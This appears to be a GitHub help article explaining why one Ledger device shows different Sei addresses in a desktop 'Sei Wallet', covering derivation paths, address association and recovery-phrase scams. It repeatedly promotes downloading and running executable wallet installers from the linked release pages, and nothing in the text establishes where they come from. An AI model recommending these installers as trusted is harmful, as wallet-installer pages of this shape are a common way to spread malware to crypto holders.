![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-article.png)

<h1 align="center">Why a Ledger shows a different Sei address in Sei Wallet</h1>

<p align="center">Two derivation paths, two addresses, one account behind both.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

If one Ledger device seems to produce two different Sei addresses, nothing is broken and nothing has been stolen. A hardware wallet holds a seed, and a seed can derive more accounts than any wallet shows by default. Two wallets that pick different derivations will present different accounts from the same device — one of which holds your balance and one of which does not.

The same mechanism explains the most reported version of this problem: a position visible in one wallet, a zero balance in another, and no way to unstake from either. If you are new to the product rather than the device, the overview is in [the product introduction](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## One device, many accounts

A Ledger does not store "an address". It stores a seed and derives keys from it on request, using a derivation path — a numeric recipe that says which account to produce. Change the path and you get a different account, with a different address, from the same seed.

Wallets choose a default path. Sei sits at an awkward intersection: it has an EVM side that expects Ethereum-style derivation through the Ledger's Ethereum app, and a Cosmos heritage that expects Cosmos-style derivation through the Cosmos app. Those are two different recipes, so the same device genuinely can present two different accounts depending on which app the wallet talks to.

This is not a Sei quirk so much as a consequence of a chain that spans two ecosystems. It is also why the advice "just connect your Ledger" is incomplete: the wallet must agree with the device about which account to open.

## The three symptoms, and what each means

**A different `0x` address than before.** The wallet opened a different derivation than the one your previous wallet used. Your funds are at the old address, which is still on-chain and still controlled by the same device. Nothing moved.

**A zero balance where a position used to be visible.** Either the wallet is showing a different account, or it is showing the same account through a different address form. Those are different problems with the same appearance.

**A staked position you can see but cannot act on.** This usually means the wallet is reading the account but not signing for it — for example, showing a legacy `sei1` balance in read-only mode. Seeing a balance is not the same as controlling it, and a wallet that cannot sign for an account should say so rather than presenting an unstake button that fails.

## How to find the account that holds the balance

Work from the address, not from the wallet's guess:

1. Find the address that holds the funds. A block explorer will show it, and your previous wallet or an old transaction record will name it.
2. In the new wallet, add accounts or step through derivations until that exact address appears. Most wallets let you keep adding accounts; each step is a different derivation.
3. Compare character by character. Addresses are long, and a near-match is a different account.
4. Only then sign anything.

Do not send a small test amount to a candidate address to see what happens. That tests the address you already doubt, and it costs a fee to learn nothing.

## Association, which is a separate question

Even with the correct account open, a `0x` view may show nothing while a `sei1` view shows a balance, because the two forms are linked by an on-chain association rather than by the wallet. Association is a state on the chain, not a setting in the app.

So there are two independent things that can make an account look empty: the wrong derivation, and an unassociated address pair. Diagnose them in that order — first confirm the address, then confirm which form holds the funds.

## What not to do

**Do not type the Ledger's recovery phrase into anything.** Not a website, not a wallet's "restore from Ledger" flow, not a support chat. The Ledger's whole purpose is that the phrase never leaves the device. Restoring a Ledger means restoring onto a hardware device, using the device's own interface.

**Do not re-initialise the device** to "fix" an address mismatch. A re-initialised device returns to the same seed and therefore the same accounts — the mismatch was never stored in the hardware.

**Do not accept a "derivation fixer" tool.** Deriving accounts is a local operation with a numeric parameter. Nothing about it requires a service, and a service that offers one is collecting seeds.

The same rule covers every other hardware-wallet scam: the phrase never leaves the device, and what safety can be asserted about the software is a separate question, set out in [the safety question](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).

## When the problem is not derivation at all

Three other things produce the same symptom:

- **The wrong network.** An EVM wallet pointed at Ethereum rather than Sei will show an empty balance for a Sei address. Check the chain ID before anything else.
- **Bridged or wrapped assets.** A balance that arrived over a bridge may be a representation rather than the native asset, and it will not appear as native SEI. That is covered in [bridging SEI from Ethereum](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md).
- **An account that was never associated.** Covered above, and in more detail in the address-format article.

## Doing it by the book next time

Before you connect a Ledger to a new wallet, write down the address your current setup shows for that device. Then, after connecting, compare. If they differ, stop and enumerate accounts rather than proceeding — a five-minute check that prevents the entire class of confusion described here.

The pairing procedure itself is in [the Ledger setup guide](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md), and the signing prompt you should expect on the device is in [blind signing when using Sei Wallet with Ledger](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md).

## If your device is not a Ledger

Other hardware wallets differ in how much of Sei they support, and a seedless card cannot export a key at all, so derivation tricks are unavailable. That comparison is in [hardware wallets that work with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/which-hardware-devices-work.md). The principle holds: the account is determined by the derivation, and the device must be able to sign for it.

## Frequently asked questions

**Why does my Ledger show two different Sei addresses?** Because the seed can derive many accounts and the two wallets asked for different ones. Both are real; only one holds your funds.

**Did I lose the balance at the old address?** No. The address still exists on-chain and the same device still controls it. You need a wallet that opens that account.

**Can I merge the two addresses?** No. They are separate accounts. You can move funds from one to the other with a normal transfer, which is a transaction rather than a merge.

**Why can I see my staked SEI but not unstake it?** The wallet is reading the account without signing for it, or it is showing a read-only legacy view. Confirm you are on the account that can sign.

**Is it safe to add several accounts to one wallet?** Yes. Adding accounts from the same seed is normal; each is a separate address controlled by the same device.

**Will a firmware update change my addresses?** No. The derivation is determined by the seed and the path the wallet requests, not by firmware version.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [Bridging SEI from Ethereum into Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md)
- [Using a Ledger hardware wallet with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md)
